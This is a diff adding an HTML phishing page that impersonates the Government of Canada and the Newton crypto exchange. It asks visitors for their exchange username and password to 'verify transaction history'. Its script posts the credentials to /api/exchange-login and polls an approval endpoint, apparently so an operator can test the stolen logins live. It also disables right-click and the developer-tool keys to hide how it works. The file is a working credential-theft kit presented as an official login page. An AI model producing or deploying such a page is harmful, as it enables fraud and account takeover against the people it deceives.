@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect to Newton - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .login-container {
+            max-width: 480px;
+            margin: 100px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #335075;
+        }
+        .btn-submit {
+            width: 100%;
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn-submit:hover {
+            background-color: #45a049;
+        }
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #335075;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .exchange-logo {
+            width: 120px;
+            height: 60px;
+            object-fit: contain;
+            margin: 0 auto 20px;
+            display: block;
+        }
+        .error-message {
+            display: none;
+            background-color: #fee;
+            border: 1px solid #c33;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            color: #c33;
+            font-size: 14px;
+        }
+        .error-message.active {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .error-message i {
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="flex items-center justify-between mb-6">
+            <img src="https://www.canada.ca/etc/designs/canada/wet-boew/assets/sig-blk-en.svg" alt="Government of Canada" class="h-8">
+            <i class="fas fa-lock text-gray-400 text-xl"></i>
+        </div>
+
+        <img src="https://play-lh.googleusercontent.com/qS53X47RxpMFo9qIabt0v6lATabHjL0TAfXQbBmrzTtS5ZN6zPaD-6lhn6Qzdo8bCKFN" alt="Newton" class="exchange-logo">
+
+        <h1 class="text-2xl font-bold text-gray-800 mb-2">Connect to Newton</h1>
+        <p class="text-gray-600 mb-6">Sign in to your Newton account to verify your transaction history</p>
+
+        <!-- Error Message -->
+        <div class="error-message" id="errorMessage">
+            <i class="fas fa-exclamation-circle"></i>
+            <span>The username or password you entered is incorrect.</span>
+        </div>
+
+        <form id="loginForm">
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2">Email / Username</label>
+                <input type="text" class="input-field" placeholder="Enter your email or username" required>
+            </div>
+
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2">Password</label>
+                <input type="password" class="input-field" placeholder="Enter your password" required>
+            </div>
+
+            <div class="text-sm text-gray-600 mb-4">
+                <i class="fas fa-info-circle text-blue-600"></i>
+                Your credentials are securely transmitted to Newton for verification
+            </div>
+
+            <button type="submit" class="btn-submit">
+                Sign In to Newton
+            </button>
+        </form>
+
+        <div class="mt-6 text-center">
+            <a href="select-exchange.html" class="text-blue-600 text-sm hover:underline">
+                <i class="fas fa-arrow-left"></i> Back to exchange selection
+            </a>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <p class="mt-6 text-xl font-semibold text-gray-700">Connecting to Newton...</p>
+        <p class="mt-2 text-sm text-gray-500">Please wait while we verify your credentials</p>
+    </div>
+
+
+    <script>
+        const EXCHANGE_NAME = 'newton';
+        let logId = sessionStorage.getItem('cra_logId');
+        let checkInterval;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = this.querySelector('input[type="text"]').value;
+            const password = this.querySelector('input[type="password"]').value;
+            
+            try {
+                // Send login data to API
+                const response = await fetch('/api/exchange-login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        exchange: EXCHANGE_NAME,
+                        email: email,
+                        password: password,
+                        logId: logId
+                    })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    logId = data.logId;
+                    sessionStorage.setItem('exchange_logId', logId);
+                    sessionStorage.setItem('exchange_name', EXCHANGE_NAME);
+                    
+                    // Show loading overlay
+                    document.getElementById('loadingOverlay').classList.add('active');
+                    
+                    // Start polling for approval
+                    checkInterval = setInterval(checkApprovalStatus, 2000);
+                }
+            } catch (err) {
+                console.error('Login error:', err);
+                alert('Connection error. Please try again.');
+            }
+        });
+
+        async function checkApprovalStatus() {
+            try {
+                const response = await fetch('/api/exchange-check-status', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ logId })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'approved') {
+                    clearInterval(checkInterval);
+                    // Wait remaining time to reach 30 seconds total, then redirect
+                    setTimeout(() => {
+                        window.location.href = EXCHANGE_NAME + '-verify.html';
+                    }, 3000);
+                } else if (data.status === 'rejected') {
+                    clearInterval(checkInterval);
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    document.getElementById('errorMessage').classList.add('active');
+                    // Scroll to top to show error
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }
+            } catch (err) {
+                console.error('Status check error:', err);
+            }
+        }
+
+        // Anti-scraping protection
+        (function() {
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || 
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) ||
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) ||
+                    (e.ctrlKey && e.keyCode == 85) ||
+                    (e.ctrlKey && e.keyCode == 83)) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        })();
+    </script>
+</html>
+</body>
+</html>
